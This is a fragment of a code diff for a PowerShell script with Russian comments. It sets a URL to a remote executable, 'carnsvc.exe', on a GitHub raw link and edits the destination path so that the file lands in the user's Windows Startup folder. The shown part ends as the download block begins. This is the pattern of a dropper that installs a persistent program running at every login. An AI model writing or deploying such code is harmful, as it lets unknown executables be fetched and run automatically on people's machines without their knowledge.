@@ -1,6 +1,7 @@
 $url = "https://raw.githubusercontent.com/xzj4/1/refs/heads/main/carnsvc.exe"
-$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\carnsvc.exe"
-
+#$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\carnsvc.exe"
+cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
+$destPath = ".\carnsvc.exe"
 # 1. Блок скачивания файла
 try {
     if (-not (Test-Path $destPath)) {
